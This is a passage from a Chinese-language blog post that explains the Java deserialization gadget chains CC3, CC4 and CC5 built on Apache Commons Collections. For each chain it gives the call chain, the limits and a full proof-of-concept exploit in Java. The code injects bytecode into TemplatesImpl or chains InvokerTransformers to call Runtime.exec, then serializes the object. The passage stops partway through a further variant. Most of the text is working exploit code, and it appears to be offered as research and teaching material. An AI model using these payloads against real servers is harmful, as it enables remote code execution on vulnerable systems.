org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构建字节码</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch aaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个与代理对象相关联的InvocationHandler map_handler</span></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建代理对象proxy_map来代理map_handler，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法</span></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//再创建一个AnnotationInvocationHandler对象，用来触发代理对象proxy_map的方法执行,从而跳转AnnotationInvocationHandler.voker()</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc3&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc3&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-4"   >
          <a href="#解析-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-4" class="headerlink" title="解析"></a>解析</h2>
      <p>即按照<code>CC1</code>的前半部分链子加上经典的<code>CITTN</code>即可，不过多赘述了</p>

        <h1 id="四、CC4"   >
          <a href="#四、CC4" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、CC4" class="headerlink" title="四、CC4"></a>四、CC4</h1>
      
        <h2 id="JAVA源码版本-8u40-3"   >
          <a href="#JAVA源码版本-8u40-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-3" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807120904293.png" alt="image-20220807120904293"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()-&gt;heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">TrAXFilter构造函数</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-3"   >
          <a href="#限制-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-3" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>
<p><code>PriorityQueue</code>在<code>commons-collections4</code>下才开始有</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="POC-3"   >
          <a href="#POC-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构建字节码</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch aaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line">        <span class="comment">//不用设置PriorityQueue.queue为TemplatesImpl,因为TrAXFilter构造函数可以直接触发</span></span><br><span class="line">        setField(queue,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        setField(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc4&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc4&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-5"   >
          <a href="#解析-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-5" class="headerlink" title="解析"></a>解析</h2>
      <p>感觉和<code>CC2</code>差不多，就是后面的利用链子，由于是<code>TrAXFilter</code>构造函数直接触发的，所以不用设置<code>PriorityQueue.queue</code>为<code>TemplatesImpl</code>，没有什么太多的亮点。</p>

        <h1 id="五、CC5"   >
          <a href="#五、CC5" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、CC5" class="headerlink" title="五、CC5"></a>五、CC5</h1>
      
        <h2 id="JAVA源码版本-8u40-4"   >
          <a href="#JAVA源码版本-8u40-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-4" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801095044379.png" alt="image-20220801095044379"></p>
<p>细节如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">TiedMapEntry.toString()-&gt;getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-4"   >
          <a href="#限制-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-4" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>

        <h2 id="POC-4"   >
          <a href="#POC-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;./test.sh&quot;</span>&#125;)&#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        <span class="comment">//调用Get方法</span></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);</span></span><br><span class="line">        Field val = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="解析-6"   >
          <a href="#解析-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-6" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="BadAttributeValueExpException-readObject"   >
          <a href="#BadAttributeValueExpException-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#BadAttributeValueExpException-readObject" class="headerlink" title="BadAttributeValueExpException.readObject()"></a><code>BadAttributeValueExpException.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110613623.png" alt="image-20220801110613623"></p>
<p><code>valObj</code>即为<code>TiedMapEntry</code></p>

        <h3 id="TiedMapEntry-toString-gt-getValue"   >
          <a href="#TiedMapEntry-toString-gt-getValue" class="heading-link"><i class="fas fa-link"></i></a><a href="#TiedMapEntry-toString-gt-getValue" class="headerlink" title="TiedMapEntry.toString()-&gt;getValue()"></a><code>TiedMapEntry.toString()-&gt;getValue()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110414584.png" alt="image-20220801110414584"></p>
<p>后续的<code>map</code>即为<code>LazyMap</code>，<code>key</code>为<code>123</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110428194.png" alt="image-20220801110428194"></p>

        <h3 id="LazyMap-get-1"   >
          <a href="#LazyMap-get-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get-1" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>还是经典的链子<code>CIR</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>

        <h2 id="🔺注"   >
          <a href="#🔺注" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注" class="headerlink" title="🔺注"></a>🔺注</h2>
      <p>在设置<code>BadAttributeValueExpException</code>对象时，使用的是其中的<code>Field</code>来进行设置的</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">Field val = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">val.set(poc,tiedmap);</span><br></pre></td></tr></table></div></figure>

<p>原因在于在<code>BadAttributeValueExpException</code>构造函数及<code>readObject</code>函数中，有如下代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151544294.png" alt="image-20220801151544294"></p>
<p>这样就能在序列化时不进行本地<code>RCE</code>，而在服务器反序列化时进行<code>RCE</code>，因为如果在序列化时进行本地<code>RCE</code>，<code>val</code>就会由于链子变成<code>Runtime</code>类，由于<code>Runtime</code>没办法直接序列化，所以其<code>val</code>就会变成如下执行命令结果的字符串，从而在反序列时没办法调用到<code>TiedMapEntry.toString()</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801151900635.png" alt="image-20220801151900635"></p>
<p>对比原<code>POC</code>如下，其<code>val</code>在序列化时还是一个<code>TiedMapEntry</code>对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801152047107.png" alt="image-20220801152047107"></p>

        <h2 id="无数组"   >
          <a href="#无数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#无数组" class="headerlink" title="无数组"></a>无数组</h2>
      <p>至于无数组版本的，即如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802155244072.png" alt="image-20220802155244072"></p>
<p>做点小改动，在<code>TiedMapEntry</code>中传入<code>TemplatesImpl</code>即可，确保在<code>LazyMap.get()</code>的时候，传入的<code>key</code>为<code>TemplatesImpl</code>，从而进行调用到对应的<code>TemplatesImpl.newTransformer()</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802154737033.png" alt="image-20220802154737033"></p>
<p>相关<code>POC</code>如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> test.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC5T</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NotFoundException, 